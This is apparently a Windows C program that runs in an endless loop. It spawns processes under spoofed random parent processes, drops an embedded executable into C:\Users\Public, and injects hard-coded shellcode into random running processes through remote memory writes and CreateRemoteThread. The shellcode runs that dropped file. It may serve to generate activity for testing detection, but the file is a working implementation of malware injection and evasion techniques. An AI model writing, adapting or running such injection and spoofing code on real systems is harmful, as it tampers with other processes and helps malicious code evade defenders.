#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <tlhelp32.h>
#include "net_conn.h"

#define PROCESSES_MIN 3
#define PROCESSES_MAX 5
#define NETWORK_CONNECTIONS_MIN 3
#define NETWORK_CONNECTIONS_MAX 5
#define SLEEP_INTERVAL_MIN 30
#define SLEEP_INTERVAL_MAX 180

// Shellcode to run cmd to run network connection
unsigned char buf[] = 
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x43\x3a\x5c\x55\x73\x65\x72\x73\x5c\x50\x75\x62\x6c"
    "\x69\x63\x5c\x6e\x65\x74\x5f\x63\x6f\x6e\x6e\x2e\x65\x78"
    "\x65\x00";

// Function to get a random PID from running processes, excluding specific PIDs
DWORD getRandomPid() {
    DWORD processes[1024], bytesNeeded, processCount;

    // Enumerate processes
    if (!EnumProcesses(processes, sizeof(processes), &bytesNeeded)) {
        // printf("[ERROR] Failed to enumerate processes\n");
        return 0;
    }
    processCount = bytesNeeded / sizeof(DWORD);

    // Return random PID
    while (1) {
        DWORD randomIndex = rand() % processCount;
        DWORD randomPid = processes[randomIndex];

        if (randomPid != 0 && randomPid != 4) {  // Exclude System Idle Process and System
            HANDLE hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, randomPid);
            if (hProcess != NULL) {
                CloseHandle(hProcess);
                return randomPid;
            }
            else if (GetLastError() != ERROR_ACCESS_DENIED) {
                // printf("[ERROR] Unexpected error opening process handle [%d]\n", GetLastError());
            }
        }
    }
}

// Function to create a number of random processes
void createRandomProcesses(const char *randomProcesses[], int noOfRandomProcesses, int noOfProcessesToCreate) {
    int i = 0;
    while (i < noOfProcessesToCreate) {
        // Get random PPID
        DWORD parentPid = getRandomPid();
        if (parentPid == 0) {
            continue;
        }

        STARTUPINFOEXA si;
        PROCESS_INFORMATION pi;
        SIZE_T attributeSize;
        ZeroMemory(&si, sizeof(STARTUPINFOEXA));

        // Open the parent process with the required permissions
        HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, parentPid);
        if (parentProcessHandle == NULL) {
            // printf("[ERROR] Failed to open parent process [%d]\n", GetLastError());
            continue;
        }

        // Initialize the attribute list for the startup info
        InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
        si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
        if (si.lpAttributeList == NULL) {
            // printf("[ERROR] Failed to allocate attribute list [%d]\n", GetLastError());
            CloseHandle(parentProcessHandle);
            continue;
        }

        if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize)) {
            // printf("[ERROR] Failed to initialize attribute list [%d]\n", GetLastError());
            HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
            CloseHandle(parentProcessHandle);
            continue;
        }

        // Set the parent process attribute
        if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL)) {
            // printf("[ERROR] Failed to update attribute list [%d]\n", GetLastError());
            DeleteProcThreadAttributeList(si.lpAttributeList);
            HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
            CloseHandle(parentProcessHandle);
            continue;
        }

        // Get random process to create
        int randomIndex = rand() % noOfRandomProcesses;
        const char *selectedRandomProcess = randomProcesses[randomIndex];

        // Set the size of the startup info structure
        si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

        // Create the new process
        if (!CreateProcessA(selectedRandomProcess, NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
            // printf("[ERROR] Failed to create process [%d]\n", GetLastError());
            DeleteProcThreadAttributeList(si.lpAttributeList);
            HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
            CloseHandle(parentProcessHandle);
            continue;
        }

        // Clean up
        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(parentProcessHandle);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        printf("[+] PPID %lu created %s with PID %lu\n", parentPid, selectedRandomProcess, pi.dwProcessId);
        i++;
    }
}

void processInjectionNetworkConnection(int noOfNetworkConnectionsToCreate) {
    int i = 0;
    while (i < noOfNetworkConnectionsToCreate) {
        // Get random PPID
        DWORD parentPid = getRandomPid();
        if (parentPid == 0) {
            continue;
        }

        // Open process handle
        HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, parentPid);
        if (hProcess == NULL)
        {
            // printf("[ERROR] Could not obtain handle [%d]\n", GetLastError());
            continue;
        }

        // Allocate memory
        HANDLE pAddr = VirtualAllocEx(hProcess, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pAddr == NULL)
        {
            // printf("[ERROR] Could not allocate remote memory [%d]\n", GetLastError());
            continue;
        }

        // Write payload to memory
        if (WriteProcessMemory(hProcess, pAddr, buf, sizeof(buf), NULL) == 0)
        {
            // printf("[ERROR] Could not write to remote memory [%d]\n", GetLastError());
            continue;
        }

        // Change the memory protection settings to PAGE_EXECUTE_READ
        DWORD oldProtect = 0;
        if (VirtualProtectEx(hProcess, pAddr, sizeof(buf), PAGE_EXECUTE_READ, &oldProtect) == 0)
        {
            // printf("[ERROR] Could not change the memory protection [%d]\n", GetLastError());
            continue;
        }

        // Create thread
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, sizeof(buf), pAddr, NULL, 0, NULL);
        if (hThread == NULL)
        {
            // printf("[ERROR] Could not create new thread [%d]\n", GetLastError());
            continue;
        }

        printf("[+] PPID %lu created network connection.\n", parentPid);
        i++;
    }
}

int main() {
    // Seed
    srand((unsigned int)time(NULL));

    // Random processes to create
    const char *randomProcesses[] = {
        "C:\\Windows\\System32\\notepad.exe",
        "C:\\Windows\\System32\\mspaint.exe"
    };
    int noOfRandomProcesses = sizeof(randomProcesses) / sizeof(randomProcesses[0]);

    // Write net_conn.exe
    BOOL net_conn_exe_exists = 0;
    FILE *file = fopen("C:\\Users\\Public\\net_conn.exe", "wb");
    if (file) {
        fwrite(net_conn_exe, 1, net_conn_exe_len, file);
        fclose(file);
        net_conn_exe_exists = 1;
    } else {
        // printf("[ERROR] Failed to open destination file");
    }

    while (1) {
        // Random no. of processes and network connections to create
        int noOfProcessesToCreate = (rand() % (PROCESSES_MAX - PROCESSES_MIN + 1)) + PROCESSES_MIN;
        int noOfNetworkConnectionsToCreate = (rand() % (NETWORK_CONNECTIONS_MAX - NETWORK_CONNECTIONS_MIN + 1)) + NETWORK_CONNECTIONS_MIN;

        // Random time interval for code to sleep
        int sleepInterval = (rand() % (SLEEP_INTERVAL_MAX - SLEEP_INTERVAL_MIN + 1)) + SLEEP_INTERVAL_MIN;

        // Create number of random processes and network connections
        int functionToRun = rand() % 3;
        if (functionToRun == 0) {
            createRandomProcesses(randomProcesses, noOfRandomProcesses, noOfProcessesToCreate);
        }
        else if (functionToRun == 1) {
            if (net_conn_exe_exists) {
                processInjectionNetworkConnection(noOfNetworkConnectionsToCreate);
            }
        }
        else {
            createRandomProcesses(randomProcesses, noOfRandomProcesses, noOfProcessesToCreate);
            if (net_conn_exe_exists) {
                processInjectionNetworkConnection(noOfNetworkConnectionsToCreate);
            }
        }
        
        // Sleep for random time
        for (int i = sleepInterval; i > 0; i--) {
            printf("\rSleeping for %d seconds...", i);
            fflush(stdout);
            Sleep(1000);
        }
        printf("\r");
    }

	return 0;
}
